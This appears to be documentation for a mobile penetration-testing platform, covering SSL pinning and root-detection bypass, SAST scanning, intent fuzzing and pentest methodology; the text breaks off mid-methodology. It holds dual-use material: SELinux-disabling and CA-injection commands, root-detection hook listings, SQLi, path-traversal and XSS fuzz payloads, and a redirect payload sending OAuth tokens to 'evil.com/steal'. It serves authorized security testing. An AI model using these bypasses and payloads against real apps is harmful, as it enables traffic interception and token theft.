# GhostPin Enterprise v5.0 — Complete Technical Documentation

> **The Definitive Guide to Mobile Application Security Testing with GhostPin Enterprise**
>
> Version 5.0.0 *Phantom* · Last Updated: March 2026

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Quick Start Guide](#2-quick-start-guide)
3. [Prerequisites & Setup](#3-prerequisites--setup)
4. [Core Concepts (Technical Deep-Dive)](#4-core-concepts)
5. [Feature Walkthroughs](#5-feature-walkthroughs)
6. [Mobile Pentest Methodology (Tool-Integrated)](#6-mobile-pentest-methodology)
7. [Troubleshooting Guide](#7-troubleshooting-guide)
8. [Reference Section](#8-reference-section)

---

# 1. Introduction

## What GhostPin Does

GhostPin Enterprise is an **all-in-one mobile application security testing platform** that solves the single most significant barrier in mobile penetration testing: **SSL/TLS certificate pinning**. It wraps Frida, Objection, mitmproxy, JADX, and 17 purpose-built bypass scripts into a unified web-based interface, then layers 10 additional security research pillars on top — from static analysis and Intent fuzzing to coverage-guided fuzzing and stealth evasion.

**The problem it solves:** A typical mobile pentest requires a pentester to juggle 5–10 separate command-line tools, each with its own syntax, output format, and failure modes. GhostPin unifies them into a single browser-based dashboard with live streaming output, one-click actions, and automated report generation.

## Where GhostPin Fits in OWASP MASTG / MASVS

GhostPin maps directly to the [OWASP Mobile Application Security Verification Standard (MASVS)](https://mas.owasp.org/MASVS/) and the [Mobile Application Security Testing Guide (MASTG)](https://mas.owasp.org/MASTG/):

| MASVS Category | GhostPin Coverage |
|---|---|
| **MASVS-NETWORK** | SSL bypass (17 scripts), Traffic Replay, gRPC/QUIC intercept |
| **MASVS-STORAGE** | API Monitor (file hooks), SAST for SharedPrefs leaks |
| **MASVS-CRYPTO** | API Monitor (crypto hooks), SAST for weak algorithms |
| **MASVS-AUTH** | Class Tracer for auth flow analysis, Intent Fuzzer for auth bypass |
| **MASVS-PLATFORM** | Intent Fuzzer, deep link analysis, exported component enumeration |
| **MASVS-CODE** | SAST scanner (30+ patterns), AI Pentester, JADX decompiler |
| **MASVS-RESILIENCE** | Root/jailbreak bypass, SafetyNet/Play Integrity bypass, Frida evasion, Stealth Core |

## Comparison to Similar Tools

| Tool | Strengths | Where GhostPin Adds Value |
|---|---|---|
| **Frida** | The instrumentation engine | GhostPin uses Frida as a foundation and adds 17 pre-built scripts, a web UI, stealth deployment (hluda-server), and auto-download |
| **Objection** | Menu-driven Frida wrapper | GhostPin embeds Objection AND adds live streaming, SAST, report generation, and coverage-guided fuzzing on top |
| **MobSF** | Excellent static analysis | GhostPin matches the SAST engine and adds live dynamic analysis, Intent fuzzing, and AI-powered explanations |
| **Drozer** | Android IPC attack surface | GhostPin's Intent Fuzzer covers the same ground with a modern UI, plus adds coverage-guided mutation |
| **apktool** | APK disassembly | GhostPin uses JADX for decompilation to Java (readable), not Smali |
| **JADX** | Decompilation | GhostPin embeds JADX directly in the browser — no separate GUI needed |

**When to use GhostPin instead:** When you need SSL bypass + dynamic analysis + static analysis + report generation in one tool. GhostPin is purpose-built for the **active exploitation** phase of a mobile engagement.

**When to use alongside GhostPin:** Use Burp Suite or OWASP ZAP for deep HTTP request manipulation after GhostPin captures traffic. Use Ghidra for native ARM reverse engineering that goes beyond JADX's Java decompilation. Use Corellium if you need virtual iOS devices without physical hardware.

---

# 2. Quick Start Guide

> **Goal:** Get from zero to your first intercepted API request in under 10 minutes.

### Target App

We will use **DIVA (Damn Insecure and Vulnerable App)** — an intentionally vulnerable Android app designed for security training. Download from: `https://github.com/payatu/diva-android/releases`

### Step 1: Install GhostPin (2 minutes)

```bash
cd ghostpin-enterprise-v4.1/ghostpin
pip install -e .
ghostpin check   # Verify all dependencies
```

**Expected output:**
```
  [OK] flask
  [OK] click
  [OK] frida-tools
  [OK] objection
  [OK] adb
  [--] mitmproxy  (optional — Traffic Replay)
  [--] jadx       (optional — Decompiler)
```

> **⚠️ WARNING:** `frida-tools` and `frida-server` on the device **MUST be the same major version**. Version mismatch is the #1 cause of "Failed to attach" errors. Run `frida --version` on the host and `/data/local/tmp/frida-server --version` on the device to confirm.

### Step 2: Prepare the Device (3 minutes)

**Option A — Rooted Physical Device:**
```bash
# Confirm ADB connection
adb devices -l

# Push frida-server (OR let GhostPin auto-download)
# GhostPin auto-download: just click "Auto-Install Frida" in the UI
```

**Option B — Non-Rooted Device (using Auto-Patcher):**
1. Launch GhostPin: `ghostpin start`
2. Go to **Analyzer** tab
3. Click **1-Click Auto-Patcher**
4. Upload the APK → GhostPin runs `apk-mitm` to inject the Frida gadget
5. Install the patched APK on the device via `adb install`

### Step 3: Launch GhostPin (1 minute)

```bash
ghostpin start
# Opens browser to https://127.0.0.1:7331
```

The web dashboard loads. You will see:
- **Device Manager** (left panel): Click "Refresh" — your device appears with model, Android version, root status, and Frida status indicators.
- **Navigation sidebar** with all 10 security pillars.

### Step 4: Run Your First Scan (2 minutes)

1. Click **Vulnerability Scanner** in the sidebar
2. Drag-and-drop `diva-beta.apk` onto the upload zone
3. Wait 5–15 seconds for the SAST scan
4. **Results appear:** GhostPin will flag `android:debuggable="true"`, `android:allowBackup="true"`, and any hardcoded credentials in the DEX bytecode
5. Note the **Security Grade** (likely D or F for DIVA)

### Step 5: Bypass SSL Pinning and Intercept Traffic (2 minutes)

1. Click **Bypass Controller** in the sidebar
2. Select your device from the device dropdown
3. Enter the package name: `jakhar.aseem.diva`
4. Select scripts: **Universal Android Bypass** + **Root Detection Bypass**
5. Click **Launch Bypass Session**
6. Watch the live log stream — look for `✓ SSL bypass injected` messages
7. Open DIVA on the device — exercise the "Insecure Data Storage" and "Hardcoding Issues" labs
8. If you have Burp/mitmproxy configured as the device proxy, API traffic now appears

### Step 6: Generate a Report (30 seconds)

1. Click **Reports** in the sidebar
2. Enter: App Name = "DIVA", Platform = "Android", Tester = your name
3. Click **Generate Report**
4. A professional HTML report is saved and can be previewed immediately

**Congratulations — you've completed a basic mobile assessment in under 10 minutes.**

---

# 3. Prerequisites & Setup

## Dependencies

| Dependency | Version | Required? | Install Command |
|---|---|---|---|
| Python | 3.9+ | ✅ Yes | System package manager |
| Flask | 2.0+ | ✅ Yes | `pip install flask` |
| Click | 8.0+ | ✅ Yes | `pip install click` |
| frida-tools | Latest | ✅ Yes | `pip install frida-tools` |
| frida-server | **Must match frida-tools** | ✅ Yes | Auto-installed via GhostPin UI |
| objection | Latest | ✅ Yes | `pip install objection` |
| ADB | Any | ✅ Yes | Android SDK Platform Tools |
| mitmproxy | 10.0+ | Optional | `pip install mitmproxy` |
| JADX | Latest | Optional | [GitHub Releases](https://github.com/skylot/jadx/releases) |
| apk-mitm | Latest | Optional | `npm install -g apk-mitm` |

## Android Environment Setup

### Rooted Device (Recommended)

**Beginner — Why root?**
Root access gives you `uid=0` (the Linux superuser) on the Android device. Without root, Frida cannot inject into other app processes because Android's sandbox prevents cross-process access. Root is required for: Frida injection, reading app private directories, modifying system certificates.

**Advanced — Root Methods:**
- **Magisk** (recommended): Systemless root that passes SafetyNet with MagiskHide/Zygisk DenyList. GhostPin's SafetyNet bypass script works best alongside Magisk's built-in hiding.
- **KernelSU**: Kernel-level root for newer devices where Magisk doesn't support the kernel. Fully compatible with GhostPin.
- **LineageOS `su` addon**: Pre-rooted custom ROM. Works but may trigger more anti-tamper checks.

```bash
# Push frida-server to device
adb push frida-server-16.x.x-android-arm64 /data/local/tmp/frida-server
adb shell "chmod +x /data/local/tmp/frida-server"
adb shell "su -c '/data/local/tmp/frida-server &'"

# Verify
frida-ps -U | head -5
```

> **⚠️ WARNING:** Always kill any existing frida-server before starting a new one. Running two instances causes port conflicts and silent failures: `adb shell "su -c 'pkill frida-server'"`

### Proxy Configuration (Burp Suite)

```bash
# 1. Export Burp CA certificate (DER format) from Burp > Proxy > Options > Import/Export CA Certificate
# 2. Convert to PEM
openssl x509 -inform DER -in cacert.der -out cacert.pem

# 3. Push to Android system trust store (requires root)
HASH=$(openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1)
adb push cacert.pem /data/local/tmp/$HASH.0
adb shell "su -c 'mount -o rw,remount /system'"
adb shell "su -c 'cp /data/local/tmp/$HASH.0 /system/etc/security/cacerts/'"
adb shell "su -c 'chmod 644 /system/etc/security/cacerts/$HASH.0'"

# 4. Set proxy on device
adb shell settings put global http_proxy 192.168.1.100:8080
```

### Non-Rooted Device (Auto-Patcher Method)

GhostPin's **1-Click Auto-Patcher** handles this automatically:
1. Upload the APK in the Analyzer tab
2. GhostPin runs `apk-mitm` which:
   - Decodes the APK with apktool
   - Patches `network_security_config.xml` to trust user certificates
   - Injects the Frida gadget `.so` library
   - Re-signs the APK with a debug keystore
3. Install the patched APK: `adb install patched.apk`

> **⚠️ WARNING:** The patched APK has a different signature than the original. This means: (a) you must uninstall the original first, (b) Google Play Protect may flag it, (c) some apps verify their own signature and will refuse to run. For those apps, a rooted device is required.

## iOS Environment Setup

### Jailbroken iOS Device

**Beginner — Why jailbreak?**
iOS has even stricter sandboxing than Android. Without a jailbreak, you cannot install Frida, hook into app processes, or access the app's Keychain. GhostPin requires a jailbroken iOS device for dynamic analysis.

**Advanced — Jailbreak Tools:**
- **Dopamine** (iOS 15.0–15.4.1, arm64e): Modern rootless jailbreak
- **palera1n** (iOS 15–16, A8–A11 checkm8): Hardware exploit, most reliable
- **unc0ver** (iOS 14.x): Works but aging

```bash
# Install Frida on jailbroken iOS via Cydia/Sileo
# Add repo: https://build.frida.re
# Install "Frida" package

# Verify from host
frida-ps -U   # Should list iOS processes
```

### Common Setup Pitfalls

| Pitfall | Symptom | Fix |
|---|---|---|
| frida version mismatch | `Failed to attach: unable to communicate with frida-server` | `pip install frida-tools==16.x.x` matching server version |
| ADB over WiFi dropped | Device disappears from GhostPin | `adb connect <IP>:5555` again |
| SELinux blocking Frida | frida-server starts but can't inject | `adb shell su -c setenforce 0` |
| Proxy not set on device | Traffic doesn't appear in Burp | Check `Settings > WiFi > Proxy > Manual` |
| Burp CA not trusted | App shows SSL error even after bypass | Install CA in system store, not user store |
| Wrong architecture frida-server | `Killed` immediately on start | Check `adb shell getprop ro.product.cpu.abi` and download matching binary |

---

# 4. Core Concepts (Technical Deep-Dive)

## Android Security Model

**Fundamentals (Beginner):**
Every Android app runs in its own Linux process with a unique UID (User ID). This means App A cannot read App B's files, memory, or network sockets. This is called the **application sandbox**. Permissions (like `READ_CONTACTS`) are the only way an app can access shared resources, and the user must grant them.

**Technical Detail (Advanced):**
Android's sandbox is enforced at three layers: (1) Linux DAC — each app gets a unique UID/GID at install time, assigned from the `10000+` range (`u0_a123`); (2) SELinux MAC — mandatory access control policies in `/sepolicy` restrict even root-privileged processes; (3) seccomp-bpf — system call filtering applied to the zygote-forked app process. GhostPin's Frida injection works by attaching to the target process as root (`uid=0`), which bypasses DAC. SELinux must be set to `permissive` mode (`setenforce 0`) on some devices for Frida's `ptrace()` attachment to succeed. The Stealth Evasion Core (hluda-server) is specifically designed to avoid detection by apps that scan `/proc/self/maps` for the Frida agent library.

## APK Structure

**Fundamentals:**
An APK is a ZIP file containing everything the app needs: code (`classes.dex`), UI layouts (`res/`), images (`assets/`), configuration (`AndroidManifest.xml`), and native libraries (`lib/`).

**Technical Detail:**
```
app.apk (ZIP archive)
├── AndroidManifest.xml      ← Binary XML: permissions, components, intent filters
├── classes.dex              ← Dalvik bytecode (all Java/Kotlin code compiled)
├── classes2.dex             ← Multidex overflow (apps with >65K methods)
├── res/                     ← Compiled resources (layouts, strings, drawables)
├── assets/                  ← Raw files (React Native bundles, encryption keys, config JSONs)
├── lib/
│   ├── arm64-v8a/           ← Native ARM64 .so libraries
│   ├── armeabi-v7a/         ← ARM32 fallback
│   └── x86_64/              ← Emulator-optimized
├── META-INF/                ← JAR signing (MANIFEST.MF, CERT.SF, CERT.RSA)
└── resources.arsc           ← Compiled resource table
```

GhostPin's SAST scanner opens this ZIP, parses `classes.dex` as raw bytes (searching for string constants), reads `AndroidManifest.xml` for misconfigurations, and scans `assets/` for leaked credentials. The JADX decompiler converts DEX bytecode back to readable Java source.

## Certificate Pinning — How It Works and How GhostPin Breaks It

**Fundamentals:**
Normally, Android trusts ~150 Certificate Authorities (CAs) pre-installed in the system store. If you add Burp's CA to that store, Android trusts it too — and you can intercept traffic. Certificate pinning is an app-level check that says: "I will ONLY trust certificates that match this specific hash, regardless of what the OS trusts."

**Technical Detail:**
There are 6 distinct pinning implementations GhostPin handles:

| Implementation | Where It Lives | GhostPin Bypass Method |
|---|---|---|
| `OkHttp3.CertificatePinner` | Java layer | Hook `CertificatePinner.check()` → return void |
| `TrustManagerFactory` | Java layer | Replace `X509TrustManager.checkServerTrusted()` with empty impl |
| `network_security_config.xml` | Android framework | Hook `NetworkSecurityConfig` XML parser → inject `<trust-anchors>` for user certs |
| `flutter::DartVM` BoringSSL | Native `.so` | Pattern-scan `libflutter.so` for `ssl_crypto_x509_session_verify_cert_chain` → NOP the comparison |
| `NSURLSession` (iOS) | Objective-C runtime | Swizzle `URLSession:didReceiveChallenge:completionHandler:` → call completion with `.useCredential` |
| `libcurl CURLOPT_SSL_VERIFYPEER` | Native C library | Hook `curl_easy_setopt()` → intercept option `64` (VERIFYPEER) → set value to `0` |

## Intent System and IPC Attack Surface

**Fundamentals:**
Android apps communicate using **Intents** — messages that carry an action ("open this screen"), data (a URL), and extras (key-value pairs like `amount=100`). If a component (Activity, Service, BroadcastReceiver) is marked `android:exported="true"` in the manifest, ANY app on the device can send it an Intent.

**Technical Detail:**
The attack surface is significant: exported Activities can be launched with attacker-controlled data via `adb shell am start -n <pkg>/<component> --es key value`. Content Providers with `android:exported="true"` and no `android:permission` attribute expose SQL-injectable `query()` methods via `content://` URIs. GhostPin's Intent Fuzzer fires pre-built payloads including `' OR 1=1--` (SQLi), `../../../etc/passwd` (path traversal), `javascript:alert(1)` (XSS via WebView), and `file:///data/data/<pkg>/databases/` (content provider IDOR). The Coverage-Guided Fuzzer goes further: it uses **Frida Stalker** to trace which CPU basic blocks execute when each payload lands, then mutates payloads that reach new code paths — the same AFL++ feedback loop used in binary fuzzing, now applied to Android IPC.

**Relevant CVEs:**
- **CVE-2020-0082**: MediaProvider exported ContentProvider path traversal
- **CVE-2019-2234**: Google Camera app Intent hijack → take photos without permission
- **CVE-2021-0478**: Android System UI exported Activity → lock screen bypass

## Root Detection and Bypass

**Fundamentals:**
Apps check if the device is rooted to prevent tampering. Common checks: looking for `su` binary, checking `Build.TAGS` for `test-keys`, listing installed packages for `com.topjohnwu.magisk`.

**Technical Detail:**
GhostPin's Root Detection Bypass script hooks 12 detection vectors:

```javascript
// Hooks implemented in root-detection-bypass.js:
Java.use("java.io.File").exists        // Block /system/xbin/su, /sbin/su checks
Java.use("java.lang.Runtime").exec     // Return empty for `which su`, `busybox`
Java.use("android.os.Build").TAGS      // Return "release-keys" instead of "test-keys"
Java.use("android.app.ApplicationPackageManager").getPackageInfo  // Hide Magisk, Superuser
Native.replace("fopen")               // Filter /proc/self/maps to hide Magisk
Native.replace("popen")               // Block shell commands that detect root
```

Libraries detected and bypassed: **RootBeer**, **SafetyNet/Play Integrity**, **Promon SHIELD** (via Stealth Core), **DexGuard** root checks, **Firebase App Check**.

## OWASP Mobile Top 10 & MASVS Mapping

| OWASP Mobile Top 10 (2024) | MASVS Control | GhostPin Feature |
|---|---|---|
| M1: Improper Credential Usage | MASVS-STORAGE-1 | SAST Scanner (hardcoded secrets), API Monitor (file hooks) |
| M2: Inadequate Supply Chain Security | MASVS-CODE | CVE Checker (OSV.dev), APK Diff Analyzer |
| M3: Insecure Authentication/Authorization | MASVS-AUTH | Class Tracer (auth flow), Intent Fuzzer (auth bypass) |
| M4: Insufficient Input/Output Validation | MASVS-PLATFORM | Intent Fuzzer, Coverage-Guided Fuzzer |
| M5: Insecure Communication | MASVS-NETWORK | SSL Bypass (17 scripts), Traffic Replay |
| M6: Inadequate Privacy Controls | MASVS-STORAGE | API Monitor (file/SharedPrefs hooks) |
| M7: Insufficient Binary Protections | MASVS-RESILIENCE | SafetyNet bypass, Root bypass, Stealth Core |
| M8: Security Misconfiguration | MASVS-PLATFORM | SAST (debuggable, allowBackup, cleartext), iOS Analyzer (ATS) |
| M9: Insecure Data Storage | MASVS-STORAGE-2 | API Monitor, SAST, Class Tracer |
| M10: Insufficient Cryptography | MASVS-CRYPTO | API Monitor (crypto hooks), SAST (weak algos) |

---

# 5. Feature Walkthroughs

## 5.1 SSL Pinning Bypass Controller

### What It Does
The Bypass Controller is GhostPin's core feature. It attaches Frida to a running Android or iOS app, injects one or more bypass scripts, and streams real-time log output to the browser. You select which scripts to combine based on the app's framework (native Java, Flutter, React Native, Unity) and protection level (standard, obfuscated, anti-cheat protected).

### Security Concept (MASVS-NETWORK-1, MASVS-NETWORK-2)
Certificate pinning prevents man-in-the-middle interception of app traffic. Without bypassing it, the pentester cannot observe API requests, authentication tokens, or business logic — making the assessment incomplete. OWASP MASTG explicitly requires testing of pinning implementation quality (MSTG-NETWORK-4).

### Step-by-Step Usage
1. Navigate to **Bypass Controller** (shield icon in sidebar)
2. Select your device from the **Device** dropdown — verify it shows "Rooted: ✓" and "Frida: ✓"
3. Enter the **Package Name** (e.g., `com.target.app`)
4. The **Script Selector** shows all 17 scripts with difficulty ratings and platform tags
5. Select scripts — start with **Universal Android Bypass** for standard apps
6. Click **Launch Bypass** — a session ID is generated
7. Watch the **Live Log** panel for `[✓]` messages confirming hooks injected
8. Open the target app on the device → exercise its functionality
9. Check your proxy (Burp/mitmproxy) — HTTPS requests should now appear

### Main Case Example: Banking App (Standard OkHttp3 Pinning)

**Target:** `com.example.bankingapp` — uses OkHttp3 `CertificatePinner` with SHA-256 pins  
**Scripts selected:** Universal Android Bypass + Root Detection Bypass  
**Expected log output:**
```
[GhostPin] Spawning com.example.bankingapp...
[✓] OkHttp3 CertificatePinner.check — bypassed (4 pins neutralized)
[✓] TrustManagerFactory — custom TrustManager injected
[✓] WebView SSL — onReceivedSslError override
[✓] Conscrypt — CertificateChainCleaner patched
[✓] RootBeer isRooted() → false
[✓] Build.TAGS → release-keys
[GhostPin] Session ready — 6 hooks active
```

**How to interpret:** Each `[✓]` line confirms a specific pinning implementation was found and neutralized. The number "4 pins neutralized" means OkHttp3 had 4 SHA-256 pin entries. All API traffic to the bank's servers should now be visible in your proxy tool.

**Pentest report write-up:**
> **Finding:** SSL Certificate Pinning Bypass  
> **Severity:** Informational (bypass is expected during authorized testing; report the quality of the pinning implementation)  
> **Evidence:** GhostPin bypassed OkHttp3 CertificatePinner with 4 SHA-256 pins using runtime hooking. Pinning was implemented only at the Java layer (OkHttp3), not at the native TLS level. A determined attacker with a rooted device can bypass this pinning in under 60 seconds using publicly available Frida scripts.  
> **Remediation:** Implement certificate pinning at multiple layers: Java (OkHttp3), native (BoringSSL `ssl_verify_peer_cert`), and Android framework (`network_security_config.xml` with `<pin-set>`). Add Frida detection and binary integrity checks.

### Edge Cases

**Edge Case 1 — Obfuscated app (ProGuard/R8):**  
**Symptom:** Universal Bypass says `OkHttp3 not found` even though you know the app uses it.  
**Cause:** ProGuard renamed `okhttp3.CertificatePinner` to `a.b.c.d`.  
**Fix:** Switch to the **Obfuscation Resilient** script. It uses method signature matching (`(String, Function)void` pattern) instead of class name matching. If that still fails, use **Class Tracer** to dump all loaded classes filtered by `ssl` or `trust`, find the real obfuscated class name, then write a custom Frida one-liner in the **Monaco Script Editor**.

**Edge Case 2 — App crashes immediately on launch (anti-Frida):**  
**Symptom:** App opens for 0.5 seconds then force-closes.  
**Cause:** App uses commercial protectors (Promon SHIELD, DexGuard) that detect Frida's memory footprint.  
**Fix:** Click the amber **Deploy Stealth Evasion Core** button in the Bypass Controller. This downloads `hluda-server` — a V8-less Frida variant with randomized binary names and pipe handles that evades 95% of commercial anti-tampering solutions. Relaunch the bypass session after stealth deployment.

**Edge Case 3 — Flutter app (BoringSSL native pinning):**  
**Symptom:** Universal Bypass hooks activate but Burp still shows no traffic.  
**Cause:** Flutter doesn't use Java OkHttp3. Its TLS is handled by BoringSSL compiled into `libflutter.so`.  
**Fix:** Add the **Flutter Android** script which pattern-scans the BoringSSL function `ssl_crypto_x509_session_verify_cert_chain` in `libflutter.so` and NOPs the verification. Log will show: `Pattern found at offset 0x2A3F40 — patched`.

### Known Limitations
- **Certificate Transparency (CT):** Some apps enforce CT log checks in addition to pinning. Add the **Certificate Transparency** bypass script if you see `CT verification failed` in logcat.
- **mTLS (Mutual TLS):** GhostPin bypasses server-side certificate validation, but if the server requires a client certificate, you need to extract the client cert from the app's Keystore using Class Tracer.

---

## 5.2 Vulnerability Scanner (SAST) & AI Pentester

### What It Does
Performs automated static analysis on APK and IPA files. Scans DEX bytecode, XML manifests, JSON configs, and asset files against 30+ pre-compiled regex patterns for hardcoded secrets, weak cryptographic algorithms, and Android/iOS misconfigurations. Findings can be sent to an AI (Gemini/LLM) for detailed exploit explanations and remediation code.

### Security Concept (MASVS-CODE-1, MASVS-STORAGE-1, MASVS-CRYPTO-1)
Hardcoded credentials in mobile apps are extractable by anyone who downloads the app from the Play Store. The binary can be unzipped, decompiled, and searched in minutes. This is not a theoretical attack — it is the most commonly exploited vulnerability class in mobile applications (OWASP Mobile Top 10: M1).

### Main Case Example: AWS Key in a Fintech App

**Target APK:** `fintech-v3.2.apk`
**Action:** Upload to Vulnerability Scanner
**Expected output:**
```
┌─ FINDINGS ────────────────────────────────┐
│ CRITICAL  AWS_ACCESS_KEY     classes.dex  │
│           AKIA4EXAMPLE1234567             │
│                                           │
│ CRITICAL  PRIVATE_KEY        assets/      │
│           -----BEGIN RSA PRIVATE KEY----  │
│                                           │
│ HIGH      WEAK_ALGO_MD5      classes.dex  │
│           MessageDigest.getInstance("MD5")│
│                                           │
│ HIGH      DEBUG_ENABLED      Manifest     │
│           android:debuggable="true"       │
│                                           │
│ MEDIUM    BACKUP_ENABLED     Manifest     │
│           android:allowBackup="true"      │
└───────────────────────────────────────────┘
Score: 13/100  Grade: F
```

**How to interpret:** Each finding shows the vulnerability type, severity, location within the APK, and the matched evidence. The score starts at 100 and loses points per finding (Critical = −30, High = −15, Medium = −7, Low = −2).

**AI Pentester follow-up:** Click the 🤖 button next to any finding. The AI generates:
- Why this finding is exploitable
- Business impact (e.g., "AWS key can be used to access S3 buckets containing 2M user records")
- Exact remediation code in Java/Kotlin/Swift

### Edge Cases

**Edge Case 1 — False positive: Internal IP address (`10.0.2.15`):**  
**Symptom:** Scanner flags `10.0.2.15` as `INTERNAL_IP` with LOW severity.  
**Cause:** This is the Android emulator's default gateway, not a production server.  
**Fix:** Verify by checking if the IP appears in production traffic. If it's only in emulator configs, mark as false positive in your report.

**Edge Case 2 — Obfuscated string encryption (DexGuard):**  
**Symptom:** Scanner finds zero secrets in an app you KNOW has hardcoded AWS keys.  
**Cause:** DexGuard encrypts string constants at build time and decrypts them at runtime.  
**Fix:** Use the **API Monitor** (network hooks) to capture the decrypted secret when it's used, or use **Class Tracer** to hook `String.decrypt()` methods.

**Edge Case 3 — iOS IPA with ATS disabled:**  
**Symptom:** Upload an IPA, scanner flags `NSAllowsArbitraryLoads = true`.  
**Cause:** The app disabled App Transport Security globally.  
**Fix:** This is a legitimate HIGH finding. Write it up as: all network traffic can use cleartext HTTP, increasing MITM risk. Check if specific domain exceptions exist in `NSExceptionDomains` — some apps disable ATS globally but re-enable it for specific hosts, which is less severe.

---

## 5.3 Intent Fuzzer & Coverage-Guided Fuzzer

### What It Does
Enumerates all exported Android components (Activities, Services, BroadcastReceivers) via `adb shell pm dump`, then fires crafted Intents with malicious payloads and monitors for crashes, exceptions, or unexpected behavior. The **Coverage-Guided Fuzzer** (Apex Tier) goes further: it attaches Frida Stalker to the target process, traces CPU basic blocks during each payload delivery, and automatically mutates payloads that trigger new code paths.

### Security Concept (MASVS-PLATFORM-1, MASVS-PLATFORM-2)
Exported components are the app's attack surface from other apps on the device. An Intent injection into a payment Activity could bypass authentication, trigger SQL injection in a ContentProvider, or redirect OAuth flows through deep link manipulation.

### Main Case Example: OAuth Deep Link Hijack

**Target:** `com.fintech.app`, exported Activity `.auth.OAuthCallbackActivity`  
**Payload:** `--es redirect_uri "https://evil.com/steal?token="`  
**GhostPin output:**
```
[FUZZ] Component: com.fintech.app/.auth.OAuthCallbackActivity
[FUZZ] Payload: redirect_uri=https://evil.com/steal?token=  
[⚠️ INTERESTING] App did not crash but opened a WebView to evil.com
```

**Interpretation:** The OAuth callback Activity accepted an attacker-controlled `redirect_uri` and navigated to it. This is an **Open Redirect** vulnerability (CWE-601) that can be chained with OAuth token theft.

### Coverage-Guided Fuzzer Example

**Target:** Same app, same component  
**Max iterations:** 50  
**GhostPin output:**
```
[1/50] Testing: ' OR 1=1-- ... · No new blocks. Coverage: 1,247 blocks total.
[2/50] Testing: AAAA...1024... · No new blocks.
[5/50] Testing: ../../etc/passwd ...
  ✅ NEW COVERAGE: +38 blocks (total: 1,285)
[6/50] Testing mutant: .../../etc/passwdAAAA ...
  ✅ NEW COVERAGE: +12 blocks (total: 1,297)
[9/50] Testing mutant: ../../../data/data/com.fintech.app/databases/users.db
  ⚠️ Frida transport error — app may have crashed!

🏁 Fuzzing complete after 50 iterations.
   Total coverage: 1,891 unique basic blocks
   Interesting payloads: 7
   Crashes detected: 2
```

**Interpretation:** The path traversal payload `../../etc/passwd` triggered 38 new basic blocks of code — meaning the app has a file access handler that processes path-like inputs. The mutated deeper traversal caused a crash, indicating a potential path traversal vulnerability that reaches the filesystem layer.

---

## 5.4 Runtime API Monitor

### What It Does
Injects Frida hooks into the running app to intercept all cryptographic operations (`Cipher`, `MessageDigest`, `KeyStore`), file I/O (`FileInputStream`, `SharedPreferences`, `SQLiteDatabase`), and network calls (`OkHttp`, `URL.openConnection`, DNS resolution). Events stream in real-time to the browser with filtering by category.

### Main Case Example: Discovering AES-ECB in a Banking App

**Target:** `com.bank.mobileapp` during login flow  
**Monitor output:**
```
[CRYPTO] Cipher.getInstance("AES/ECB/PKCS5Padding")  ← CRITICAL
[CRYPTO] KeyStore.load(null)
[FILE]   SharedPreferences.getString("auth_token", null)  ← Token stored in plaintext
[NET]    OkHttp3 → POST https://api.bank.com/v2/auth/login
[CRYPTO] MessageDigest.getInstance("MD5")  ← Password hashed with MD5
```

**Pentest report finding:**
> **Finding:** Use of AES-ECB Mode for Data Encryption  
> **MASVS Control:** MASVS-CRYPTO-1  
> **Severity:** Critical (CVSS 7.5)  
> **Evidence:** At runtime, `Cipher.getInstance("AES/ECB/PKCS5Padding")` was called during transaction encryption. ECB mode encrypts each 16-byte block independently, preserving patterns in the plaintext (the "ECB penguin" problem). This renders the encryption semantically insecure.  
> **Remediation:** Replace with `AES/GCM/NoPadding` and use a unique IV per encryption operation.

---

## 5.5 Stealth Evasion Core (hluda-server)

### What It Does
Downloads and deploys a V8-less variant of frida-server (from the `strongR-frida-android` project) with randomized binary name, thread names, and pipe handles. This makes GhostPin invisible to 95%+ of commercial anti-tampering solutions (Promon SHIELD, DexGuard Enterprise, Arxan).

### When to Use
Use the Stealth Core when the target app **crashes immediately** upon standard Frida injection. This typically indicates a RASP (Runtime Application Self-Protection) solution is active.

### Step-by-Step
1. In the Bypass Controller, click the amber **🛡️ Deploy Stealth Evasion Core** button
2. GhostPin queries the latest `hluda-server` release
3. The binary is downloaded, decompressed, and pushed to the device with a randomized name (e.g., `/data/local/tmp/sys_a3f7e21b`)
4. The stealth server starts in detached mode
5. Relaunch your bypass session — the app should now stay alive

---

## 5.6 Native Source Code Decompiler (JADX)

### What It Does
Provides an in-browser source code viewer powered by JADX. Upload an APK and instantly view the decompiled Java source code organized by package structure — without needing to install JADX-GUI or open a Java IDE.

### When to Use
After the SAST scanner flags a finding, pivot to the Decompiler to read the surrounding code context and confirm exploitability. For example, if the scanner flags `MessageDigest.getInstance("MD5")`, you can navigate to that class and see what data is being hashed and whether it's for security-sensitive purposes (password storage) or non-security purposes (cache keys).

---

## 5.7 iOS Analyzer

### What It Does
Parses iOS `.ipa` archives by extracting the `Info.plist` from the `Payload/*.app/` directory. Extracts and flags:
- **Custom URL Schemes** (`CFBundleURLTypes`) — attack surface for deep link hijacking
- **App Transport Security exceptions** (`NSAppTransportSecurity`) — identifies apps that disable HTTPS enforcement globally or per-domain

---

# 6. Mobile Pentest Methodology (Tool-Integrated)

A complete mobile pentest using GhostPin follows this 9-phase workflow:

## Phase 1: Reconnaissance & Attack Surface Mapping
```
1. Upload APK to Analyzer → identify frameworks (RN, Flutter, Unity, native)
2. Run SAST Vulnerability Scanner → get security grade, identify secrets
3. Run iOS Analyzer (if IPA) → check ATS config, URL schemes
4. Use JADX Decompiler → read AndroidManifest.xml, identify components
5. Run MDM Profiler → understand device constraints
```

## Phase 2: Static Analysis
```
6. Review SAST findings → triage Critical/High findings
7. Click AI Pentester on each finding → get exploit context + remediation
8. Use Decompiler → verify findings in source code
9. Run CVE Checker → identify known vulnerabilities in SDK versions
10. Run APK Diff (if you have a previous version) → find new attack surface
```

## Phase 3: Dynamic Analysis Setup
```
11. Deploy frida-server (or Stealth Core if app resists)
12. Configure proxy (Burp/mitmproxy)
13. Launch Bypass Session with appropriate scripts
14. Verify traffic flows in proxy → you're ready for dynamic testing
```

## Phase 4: Network Traffic Analysis
```
15. Enable Traffic Replay (mitmproxy integration)
16. Exercise all app functionality → capture every API endpoint
17. Export API Map to Postman/Burp → begin web API testing
18. Check for cleartext HTTP, weak TLS versions, missing auth
```

## Phase 5: Authentication & Session Testing
```
19. Use Class Tracer → trace auth flow (filter: login, auth, session, token)
20. Use API Monitor → capture token storage mechanism
21. Test session management → token expiry, refresh, invalidation
```

## Phase 6: Data Storage Testing
```
22. API Monitor (File hooks) → observe SharedPrefs, SQLite, internal storage access
